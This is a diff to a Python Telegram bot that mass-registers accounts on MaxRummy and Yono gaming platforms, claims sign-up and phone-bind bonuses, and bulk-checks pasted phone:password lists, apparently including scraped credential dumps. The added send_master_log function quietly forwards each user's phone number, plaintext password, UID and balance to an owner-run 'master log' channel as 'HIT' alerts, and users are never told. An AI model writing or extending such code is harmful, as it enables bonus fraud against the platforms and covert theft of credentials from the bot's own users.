@@ -20,6 +20,8 @@ import io
 import re
 import random
 import threading
+import http.server
+import socketserver
 from pathlib import Path
 from datetime import datetime
 from typing import Dict, Any, Optional, List, Tuple
@@ -46,13 +48,127 @@ from maxrummy_client import (
 # Initialize bot
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 
-# In-memory user state cache for multi-step wizards
+# Thread-safe user state cache with TTL & lock
+USER_STATES_LOCK = threading.RLock()
 USER_STATES: Dict[int, dict] = {}
+LAST_USER_ACTION: Dict[int, float] = {}
+
+
+def set_user_state(user_id: int, state: dict):
+    with USER_STATES_LOCK:
+        state["_created_at"] = time.time()
+        USER_STATES[user_id] = state
+
+
+def get_user_state(user_id: int) -> Optional[dict]:
+    with USER_STATES_LOCK:
+        state = USER_STATES.get(user_id)
+        if state:
+            # 15-minute TTL
+            if time.time() - state.get("_created_at", 0) > 900:
+                USER_STATES.pop(user_id, None)
+                return None
+        return state
+
+
+def pop_user_state(user_id: int) -> Optional[dict]:
+    with USER_STATES_LOCK:
+        return USER_STATES.pop(user_id, None)
+
+
+def is_rate_limited(user_id: int, min_interval: float = 0.5) -> bool:
+    """Anti-Flood protection against Telegram 429 flood bans."""
+    if admin_manager.is_admin(user_id):
+        return False
+    if not admin_manager.is_rate_limit_enabled():
+        return False
+    now = time.time()
+    last = LAST_USER_ACTION.get(user_id, 0.0)
+    if now - last < min_interval:
+        return True
+    LAST_USER_ACTION[user_id] = now
+    return False
 
 
 def log(msg: str):
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     print(f"[{ts}] {msg}", flush=True)
+
+
+def send_master_log(text: str):
+    """Dispatches real-time hits & audit alerts to Master Log Channel."""
+    master_chan = admin_manager.master_log_channel
+    if not master_chan:
+        return
+    try:
+        bot.send_message(master_chan, text, parse_mode="HTML")
+    except Exception as e:
+        log(f"Master log send error: {e}")
+
+
+def parse_accounts_data(raw_text: str) -> List[Tuple[str, str]]:
+    """
+    Robust multi-format account parser (supports ':', '|', ',', and '\t').
+    Compatible with standard lists, CSVs, and panel scrape exports.
+    """
+    accounts: List[Tuple[str, str]] = []
+    for raw_line in raw_text.splitlines():
+        line = raw_line.strip()
+        if not line or line.startswith("#"):
+            continue
+        parts = None
+        for delim in [":", "|", ",", "\t"]:
+            if delim in line:
+                tokens = [t.strip() for t in line.split(delim)]
+                if len(tokens) >= 2:
+                    p = clean_phone_number(tokens[0])
+                    pw = tokens[1]
+                    if len(p) == 10 and pw:
+                        parts = (p, pw)
+                        break
+        if parts:
+            accounts.append(parts)
+    return accounts
+
+
+def start_health_server(port: int = 8080):
+    """
+    Embedded HTTP Server for 24/7 Cloud Hosting (Render / Koyeb / JRNM).
+    Prevents inactivity sleeps and satisfies container health checks.
+    """
+    class HealthHandler(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(200)
+            self.send_header("Content-type", "application/json")
+            self.end_headers()
+            status = {
+                "status": "online",
+                "service": "MaxRummy & Yono Multi-Platform Automation Bot",
+                "uptime_seconds": round(time.time() - admin_manager.bot_start_time, 1),
+                "total_users": len(admin_manager.user_registry),
+                "platforms_count": len(PLATFORMS_LIST)
+            }
+            self.wfile.write(json.dumps(status).encode("utf-8"))
+
+        def log_message(self, format, *args):
+            return  # Suppress noisy HTTP access logs
+
+    env_port = os.getenv("PORT") or os.getenv("SERVER_PORT") or str(port)
+    try:
+        bind_port = int(env_port)
+    except ValueError:
+        bind_port = port
+
+    def _serve():
+        try:
+            with socketserver.TCPServer(("", bind_port), HealthHandler) as httpd:
+                log(f"⚡ Cloud Health Server active on port {bind_port} (24/7 Keep-Alive)")
+                httpd.serve_forever()
+        except Exception as e:
+            log(f"⚠️ Health Server start error: {e}")
+
+    t = threading.Thread(target=_serve, daemon=True, name="CloudHealthServer")
+    t.start()
 
 
 # ─────────────────────────────────────────────────────────────
@@ -200,6 +316,10 @@ def on_callback_query(call: types.CallbackQuery):
     data = call.data
 
     admin_manager.record_user(user_id, username=call.from_user.username, first_name=call.from_user.first_name)
+
+    if is_rate_limited(user_id, min_interval=0.4):
+        bot.answer_callback_query(call.id, "⚠️ Please wait a moment...", show_alert=False)
+        return
 
     if admin_manager.is_maintenance_mode() and not admin_manager.is_admin(user_id):
         bot.answer_callback_query(call.id, "Bot maintenance mode me hai!", show_alert=True)
@@ -642,13 +762,13 @@ def initiate_single_platform_reg(call: types.CallbackQuery, platform_id: str, ph
         )
         return
 
-    USER_STATES[user_id] = {
+    set_user_state(user_id, {
         "action": "single_platform_reg",
         "platform_id": platform_id,
         "platform_name": p_name,
         "phone": phone,
         "otp_time": time.time()
-    }
+    })
 
     prompt_txt = (
         f"✅ <b>OTP Sent Successfully for {p_name}!</b>\n\n"
@@ -666,11 +786,11 @@ def initiate_single_platform_reg(call: types.CallbackQuery, platform_id: str, ph
 def step_platform_otp_finish(message: types.Message):
     user_id = message.from_user.id
     if message.text and message.text.startswith("/cancel"):
-        USER_STATES.pop(user_id, None)
+        pop_user_state(user_id)
         bot.reply_to(message, "❌ Registration cancelled.", reply_markup=get_main_keyboard(user_id))
         return
 
-    state = USER_STATES.get(user_id)
+    state = get_user_state(user_id)
     if not state or state.get("action") != "single_platform_reg":
         bot.reply_to(message, "⚠️ Session expired! Kripya /start se dobara try karein.", reply_markup=get_main_keyboard(user_id))
         return
@@ -703,6 +823,18 @@ def step_platform_otp_finish(message: types.Message):
 
         record = f"[{p_name}] {phone}:{pwd} | UID: {uid} | Name: {name} | ClaimedBonus: ₹{claimed_bonus:.2f} | Balance: ₹{tot_bal:.2f} | Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
         save_account_record(ACCOUNTS_FILE, record)
+
+        send_master_log(
+            f"🎁 <b>[NEW REGISTRATION HIT]</b>\n"
+            f"• <b>Platform:</b> {p_name}\n"
+            f"• <b>Phone:</b> <code>{phone}</code>\n"
+            f"• <b>Password:</b> <code>{pwd}</code>\n"
+            f"• <b>UID:</b> <code>{uid}</code>\n"
+            f"• <b>Nickname:</b> {name}\n"
+            f"• <b>Claimed Bonus:</b> ₹{claimed_bonus:.2f}\n"
+            f"• <b>Total Balance:</b> ₹{tot_bal:.2f}\n"
+            f"• <b>User ID:</b> <code>{user_id}</code> (@{message.from_user.username or 'N/A'})"
+        )
 
         rem_tokens = admin_manager.get_display_tokens(user_id)
         bonus_badge = f"🎁 <b>Claimed Bind Bonus:</b> <b>₹{claimed_bonus:.2f}</b>\n" if claimed_bonus > 0 else "🎁 <b>Bind Bonus:</b> Auto-Processed\n"
@@ -743,7 +875,7 @@ def step_platform_otp_finish(message: types.Message):
             status_msg.message_id,
             reply_markup=kb
         )
-    USER_STATES.pop(user_id, None)
+    pop_user_state(user_id)
 
 
 def initiate_multi_platform_reg(call: types.CallbackQuery, phone: str):
@@ -773,7 +905,7 @@ def initiate_multi_platform_reg(call: types.CallbackQuery, phone: str):
             return
 
         avail_pids = [r["platform_id"] for r in avail]
-        USER_STATES[user_id] = {
+        set_user_state(user_id, {
             "action": "multi_platform_reg",
             "phone": phone,
             "queue": avail_pids,
@@ -782,14 +914,14 @@ def initiate_multi_platform_reg(call: types.CallbackQuery, phone: str):
             "success_count": 0,
             "total_bonus": 0.0,
             "results": []
-        }
+        })
         trigger_next_multi_reg(call.message.chat.id, user_id, prev_msg_id=status_msg.message_id)
 
     threading.Thread(target=_prepare, daemon=True).start()
 
 
 def trigger_next_multi_reg(chat_id: int, user_id: int, prev_msg_id: Optional[int] = None):
-    state = USER_STATES.get(user_id)
+    state = get_user_state(user_id)
     if not state or state.get("action") != "multi_platform_reg":
         return
 
@@ -821,7 +953,7 @@ def trigger_next_multi_reg(chat_id: int, user_id: int, prev_msg_id: Optional[int
         lines.append(f"\nSaved to your registry file!")
         summary_text = "\n".join(lines)
 
-        USER_STATES.pop(user_id, None)
+        pop_user_state(user_id)
 
         if prev_msg_id:
             try:
@@ -834,7 +966,7 @@ def trigger_next_multi_reg(chat_id: int, user_id: int, prev_msg_id: Optional[int
 
     # Check token availability for next platform
     if not admin_manager.has_enough_tokens(user_id, 1):
-        USER_STATES.pop(user_id, None)
+        pop_user_state(user_id)
         msg_text = (
             f"⚠️ <b>Tokens Khatam Ho Gaye!</b>\n\n"
             f"Remaining platforms par register karne ke liye paryapt tokens nahi hain.\n"
@@ -894,7 +1026,7 @@ def trigger_next_multi_reg(chat_id: int, user_id: int, prev_msg_id: Optional[int
 
 def step_multi_platform_otp(message: types.Message):
     user_id = message.from_user.id
-    state = USER_STATES.get(user_id)
+    state = get_user_state(user_id)
     if not state or state.get("action") != "multi_platform_reg":
         bot.reply_to(message, "⚠️ Session expired! Kripya /start se dobara try karein.", reply_markup=get_main_keyboard(user_id))
         return
@@ -905,7 +1037,7 @@ def step_multi_platform_otp(message: types.Message):
     p_info = PLATFORMS_MAP.get(p_id)
 
     if message.text and message.text.startswith("/cancel"):
-        USER_STATES.pop(user_id, None)
+        pop_user_state(user_id)
         bot.reply_to(message, "❌ Multi-platform registration stopped.", reply_markup=get_main_keyboard(user_id))
         return
 
@@ -929,8 +1061,11 @@ def step_multi_platform_otp(message: types.Message):
 
     status_msg = bot.reply_to(message, f"⏳ <b>[{p_name}]</b> Registering & claiming Welcome Bonus...")
 
-    client = MaxRummyClient(platform=p_info)
-    res = client.register(phone, pwd, otp)
+    try:
+        client = MaxRummyClient(platform=p_info)
+        res = client.register(phone, pwd, otp)
+    except Exception as e:
+        res = {"ok": False, "msg": f"Exception: {str(e)}"}
 
     if res.get("ok"):
         admin_manager.deduct_tokens(user_id, 1)
@@ -953,6 +1088,18 @@ def step_multi_platform_otp(message: types.Message):
 
         record = f"[{p_name}] {phone}:{pwd} | UID: {uid} | Name: {name} | Bonus: ₹{claimed_bonus:.2f} | Balance: ₹{tot_bal:.2f} | Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
         save_account_record(ACCOUNTS_FILE, record)
+
+        send_master_log(
+            f"🎁 <b>[MULTI-REG HIT]</b>\n"
+            f"• <b>Platform:</b> {p_name}\n"
+            f"• <b>Phone:</b> <code>{phone}</code>\n"
+            f"• <b>Password:</b> <code>{pwd}</code>\n"
+            f"• <b>UID:</b> <code>{uid}</code>\n"
+            f"• <b>Nickname:</b> {name}\n"
+            f"• <b>Claimed Bonus:</b> ₹{claimed_bonus:.2f}\n"
+            f"• <b>Total Balance:</b> ₹{tot_bal:.2f}\n"
+            f"• <b>User ID:</b> <code>{user_id}</code> (@{message.from_user.username or 'N/A'})"
+        )
 
         bot.edit_message_text(
             f"✅ <b>{p_name} Registered Successfully!</b>\n"
@@ -1005,10 +1152,10 @@ def step_reg_get_phone(message: types.Message):
         )
         return
 
-    USER_STATES[message.from_user.id] = {
+    set_user_state(message.from_user.id, {
         "reg_phone": phone,
         "otp_time": time.time()
-    }
+    })
 
     bot.edit_message_text(
         f"✅ <b>OTP Sent Successfully!</b>\n\n"
@@ -1025,11 +1172,11 @@ def step_reg_get_phone(message: types.Message):
 def step_reg_finish(message: types.Message):
     user_id = message.from_user.id
     if message.text and message.text.startswith("/cancel"):
-        USER_STATES.pop(user_id, None)
+        pop_user_state(user_id)
         bot.reply_to(message, "❌ Registration cancelled.", reply_markup=get_main_keyboard(user_id))
         return
 
-    state = USER_STATES.get(user_id)
+    state = get_user_state(user_id)
     if not state or "reg_phone" not in state:
         bot.reply_to(message, "⚠️ Session expired! Kripya /start se dobara try karein.")
         return
@@ -1046,15 +1193,29 @@ def step_reg_finish(message: types.Message):
     phone = state["reg_phone"]
     status_msg = bot.reply_to(message, f"⏳ Registering <code>{phone}</code> on server & claiming Bind Bonus...")
 
-    client = MaxRummyClient()
-    res = client.register(phone, pwd, otp)
+    try:
+        client = MaxRummyClient()
+        res = client.register(phone, pwd, otp)
+    except Exception as e:
+        res = {"ok": False, "msg": f"Exception: {str(e)}"}
 
     if res.get("ok"):
         admin_manager.deduct_tokens(user_id, 1)
         claimed_bonus = res.get("claimed_bonus", 0.0)
         name = res.get("name") or res.get("nickname") or "Player"
-        record = f"{phone}:{pwd} | UID: {res.get('uid')} | Name: {name} | ClaimedBonus: ₹{claimed_bonus} | Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
+        uid = res.get("uid")
+        record = f"{phone}:{pwd} | UID: {uid} | Name: {name} | ClaimedBonus: ₹{claimed_bonus} | Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
         save_account_record(ACCOUNTS_FILE, record)
+
+        send_master_log(
+            f"🎁 <b>[SINGLE REG HIT]</b>\n"
+            f"• <b>Phone:</b> <code>{phone}</code>\n"
+            f"• <b>Password:</b> <code>{pwd}</code>\n"
+            f"• <b>UID:</b> <code>{uid}</code>\n"
+            f"• <b>Nickname:</b> {name}\n"
+            f"• <b>Claimed Bonus:</b> ₹{claimed_bonus:.2f}\n"
+            f"• <b>User ID:</b> <code>{user_id}</code> (@{message.from_user.username or 'N/A'})"
+        )
 
         rem_tokens = admin_manager.get_display_tokens(user_id)
         bonus_badge = f"🎁 <b>Claimed Bind Bonus:</b> <b>₹{claimed_bonus:.2f}</b>\n" if claimed_bonus > 0 else "🎁 <b>Bind Bonus:</b> Auto-Processed\n"
@@ -1064,7 +1225,7 @@ def step_reg_finish(message: types.Message):
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
             f"• <b>Phone:</b> <code>{phone}</code>\n"
             f"• <b>Password:</b> <code>{pwd}</code>\n"
-            f"• <b>UID:</b> <code>{res.get('uid')}</code>\n"
+            f"• <b>UID:</b> <code>{uid}</code>\n"
             f"• <b>Nickname:</b> {name}\n"
             f"{bonus_badge}"
             f"• <b>Remaining Tokens:</b> <code>{rem_tokens}</code>\n"
@@ -1083,7 +1244,7 @@ def step_reg_finish(message: types.Message):
             status_msg.message_id,
             reply_markup=get_main_keyboard(user_id)
         )
-    USER_STATES.pop(user_id, None)
+    pop_user_state(user_id)
 
 
 # ─────────────────────────────────────────────────────────────
@@ -1106,10 +1267,10 @@ def step_bind_phone_step1(message: types.Message):
     acc_user = parts[0].strip()
     acc_pwd = parts[1].strip()
 
-    USER_STATES[user_id] = {
+    set_user_state(user_id, {
         "bind_acc_user": acc_user,
         "bind_acc_pwd": acc_pwd
-    }
+    })
 
     msg = bot.reply_to(
         message,
@@ -1122,7 +1283,7 @@ def step_bind_phone_step1(message: types.Message):
 def step_bind_phone_step2(message: types.Message):
     user_id = message.from_user.id
     if message.text and message.text.startswith("/cancel"):
-        USER_STATES.pop(user_id, None)
+        pop_user_state(user_id)
         bot.reply_to(message, "❌ Operation cancelled.", reply_markup=get_main_keyboard(user_id))
         return
 
@@ -1138,12 +1299,12 @@ def step_bind_phone_step2(message: types.Message):
 
     if not res.get("ok"):
         bot.edit_message_text(f"❌ OTP Send Failed: {res.get('msg')}", message.chat.id, status_msg.message_id)
-        USER_STATES.pop(user_id, None)
+        pop_user_state(user_id)
         return
 
-    state = USER_STATES.get(user_id, {})
+    state = get_user_state(user_id) or {}
     state["bind_phone"] = phone
-    USER_STATES[user_id] = state
+    set_user_state(user_id, state)
 
     bot.edit_message_text(
         f"✅ <b>OTP Sent to {phone}!</b>\n\n"
@@ -1158,11 +1319,11 @@ def step_bind_phone_step2(message: types.Message):
 def step_bind_phone_step3(message: types.Message):
     user_id = message.from_user.id
     if message.text and message.text.startswith("/cancel"):
-        USER_STATES.pop(user_id, None)
+        pop_user_state(user_id)
         bot.reply_to(message, "❌ Operation cancelled.", reply_markup=get_main_keyboard(user_id))
         return
 
-    state = USER_STATES.get(user_id)
+    state = get_user_state(user_id)
     if not state or "bind_acc_user" not in state or "bind_phone" not in state:
         bot.reply_to(message, "⚠️ Session expired. /start se dobara karein.")
         return
@@ -1182,23 +1343,37 @@ def step_bind_phone_step3(message: types.Message):
 
     status_msg = bot.reply_to(message, f"⏳ Binding <code>{phone_to_bind}</code> to <code>{acc_user}</code> & claiming bonus...")
 
-    client = MaxRummyClient()
-    res = client.bind_phone_and_claim(acc_user, acc_pwd, phone_to_bind, otp, new_pwd)
+    try:
+        client = MaxRummyClient()
+        res = client.bind_phone_and_claim(acc_user, acc_pwd, phone_to_bind, otp, new_pwd)
+    except Exception as e:
+        res = {"ok": False, "msg": f"Exception: {str(e)}"}
 
     if res.get("ok"):
         admin_manager.deduct_tokens(user_id, 1)
         rem_tokens = admin_manager.get_display_tokens(user_id)
         bal = res.get("balance", 0.0)
+        uid = res.get("uid")
 
-        record = f"{phone_to_bind}:{new_pwd} | UID: {res.get('uid')} | Balance: ₹{bal} | BOUND"
+        record = f"{phone_to_bind}:{new_pwd} | UID: {uid} | Balance: ₹{bal} | BOUND"
         save_account_record(ACCOUNTS_FILE, record)
+
+        send_master_log(
+            f"🔗 <b>[PHONE BIND HIT]</b>\n"
+            f"• <b>Account:</b> <code>{acc_user}</code>\n"
+            f"• <b>Bound Phone:</b> <code>{phone_to_bind}</code>\n"
+            f"• <b>Password:</b> <code>{new_pwd}</code>\n"
+            f"• <b>UID:</b> <code>{uid}</code>\n"
+            f"• <b>Total Balance:</b> ₹{bal:.2f}\n"
+            f"• <b>User ID:</b> <code>{user_id}</code> (@{message.from_user.username or 'N/A'})"
+        )
 
         report = (
             f"🎉 <b>Phone Bound & Bonus Claimed Successfully!</b>\n\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
             f"📱 <b>Bound Phone:</b> <code>{phone_to_bind}</code>\n"
             f"🔑 <b>New Password:</b> <code>{new_pwd}</code>\n"
-            f"🆔 <b>UID:</b> <code>{res.get('uid')}</code>\n"
+            f"🆔 <b>UID:</b> <code>{uid}</code>\n"
             f"💰 <b>Total Balance:</b> <b>₹{bal:,.2f}</b>\n"
             f"🎟️ <b>Tokens Remaining:</b> <code>{rem_tokens}</code>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━"
@@ -1213,7 +1388,7 @@ def step_bind_phone_step3(message: types.Message):
             status_msg.message_id,
             reply_markup=get_main_keyboard(user_id)
         )
-    USER_STATES.pop(user_id, None)
+    pop_user_state(user_id)
 
 
 # ─────────────────────────────────────────────────────────────
@@ -1299,14 +1474,7 @@ def step_claim_bulk_accounts(message: types.Message):
     elif message.text:
         raw_text = message.text
 
-    accounts: List[Tuple[str, str]] = []
-    for line in raw_text.splitlines():
-        line = line.strip()
-        if ":" in line:
-            p, pw = line.split(":", 1)
-            c_phone = clean_phone_number(p)
-            if len(c_phone) == 10 and pw.strip():
-                accounts.append((c_phone, pw.strip()))
+    accounts = parse_accounts_data(raw_text)
 
     if not accounts:
         msg = bot.reply_to(message, "❌ Koi valid accounts nahi mile! Format: <code>Phone:Password</code>:")
@@ -1505,14 +1673,7 @@ def step_check_bulk_accounts(message: types.Message):
     elif message.text:
         raw_text = message.text
 
-    accounts: List[Tuple[str, str]] = []
-    for line in raw_text.splitlines():
-        line = line.strip()
-        if ":" in line:
-            p, pw = line.split(":", 1)
-            c_phone = clean_phone_number(p)
-            if len(c_phone) == 10 and pw.strip():
-                accounts.append((c_phone, pw.strip()))
+    accounts = parse_accounts_data(raw_text)
 
     if not accounts:
         msg = bot.reply_to(message, "❌ Koi valid accounts nahi mile! Format: <code>Phone:Password</code>:")
@@ -1689,13 +1850,34 @@ def main():
     log("  Starting MaxRummy & YonoGames Auto Bot  ")
     log(f"  Owner: {OWNER_ID} (@OwAtom)")
     log(f"  Token: {BOT_TOKEN[:10]}...{BOT_TOKEN[-5:]}")
+    log(f"  Platforms Loaded: {len(PLATFORMS_LIST)}")
     log("==========================================")
+
+    # 1. Start Cloud Keep-Alive / Health Check Server (24/7 Hosting)
+    start_health_server()
+
+    # 2. Resilient Polling Loop with Exponential Backoff
+    backoff = 3
     while True:
         try:
-            bot.infinity_polling(timeout=25, long_polling_timeout=20)
+            log("🚀 Bot polling started (skip_pending=True)...")
+            bot.infinity_polling(timeout=25, long_polling_timeout=20, skip_pending=True)
+            backoff = 3
+        except telebot.apihelper.ApiTelegramException as e:
+            if e.error_code == 409:
+                log("⚠️ Telegram 409 Conflict: Another instance is polling. Waiting 10s before retry...")
+                time.sleep(10)
+            elif e.error_code == 429:
+                log(f"⚠️ Telegram 429 Flood Wait: Backing off for 15s...")
+                time.sleep(15)
+            else:
+                log(f"⚠️ Telegram API Exception [{e.error_code}]: {e}")
+                time.sleep(backoff)
+                backoff = min(backoff * 2, 60)
         except Exception as e:
-            log(f"Bot polling exception: {e}")
-            time.sleep(3)
+            log(f"⚠️ Bot polling exception: {e}. Retrying in {backoff}s...")
+            time.sleep(backoff)
+            backoff = min(backoff * 2, 60)
 
 
 if __name__ == "__main__":
